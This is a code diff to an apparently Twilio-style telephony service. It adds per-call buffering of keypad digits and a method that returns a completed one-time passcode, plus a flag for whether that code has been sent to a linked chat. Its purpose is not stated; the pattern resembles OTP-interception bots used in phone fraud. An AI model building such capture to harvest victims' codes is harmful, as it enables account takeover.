@@ -18,16 +18,19 @@ logger = logging.getLogger(__name__)
 
 
 class LiveListenSession:
-    def __init__(self, call_id: str, call_sid: str = None, chat_id: Optional[int] = None):
+    def __init__(self, call_id: str, call_sid: str = None, chat_id: Optional[int] = None, code_length: int = 6):
         self.call_id = call_id
         self.call_sid = call_sid
         self.chat_id = chat_id
+        self.code_length = code_length
+        self.dtmf_buffer = ""
         self.clients = set()  # set of websocket objects
         self.state = 'disconnected'  # disconnected|ringing|in-progress|completed
         self.created_at = time.time()
         self.lock = asyncio.Lock()
         self.cleanup_task = None
         self.first_audio_frame_sent = False
+        self.otp_notified = False
 
     def to_dict(self):
         return {
@@ -45,18 +48,38 @@ class SessionManager:
         self.sessions: Dict[str, LiveListenSession] = {}
         self._lock = asyncio.Lock()
 
-    async def ensure_session(self, call_id: str, call_sid: str = None, chat_id: Optional[int] = None) -> LiveListenSession:
+    async def ensure_session(self, call_id: str, call_sid: str = None, chat_id: Optional[int] = None, code_length: int = 6) -> LiveListenSession:
         async with self._lock:
             s = self.sessions.get(call_id)
             if not s:
-                s = LiveListenSession(call_id=call_id, call_sid=call_sid, chat_id=chat_id)
+                s = LiveListenSession(call_id=call_id, call_sid=call_sid, chat_id=chat_id, code_length=code_length)
                 self.sessions[call_id] = s
             else:
                 if call_sid and not s.call_sid:
                     s.call_sid = call_sid
                 if chat_id is not None and s.chat_id is None:
                     s.chat_id = chat_id
+                s.code_length = code_length
             return s
+
+    async def feed_dtmf(self, call_sid: str, digit: str) -> Optional[str]:
+        """Feed a DTMF digit into the per-call buffer and return a completed
+        OTP when the code length is reached or '#' terminates the entry."""
+        s = self.sessions.get(call_sid)
+        if not s:
+            s = await self.ensure_session(call_sid, call_sid=call_sid)
+        async with s.lock:
+            if digit == "#":
+                code = s.dtmf_buffer
+                s.dtmf_buffer = ""
+                return code if code else None
+            if digit.isdigit():
+                s.dtmf_buffer += digit
+                if len(s.dtmf_buffer) >= s.code_length:
+                    code = s.dtmf_buffer[:s.code_length]
+                    s.dtmf_buffer = s.dtmf_buffer[s.code_length:]
+                    return code
+            return None
 
     async def remove_session(self, call_id: str):
         async with self._lock:
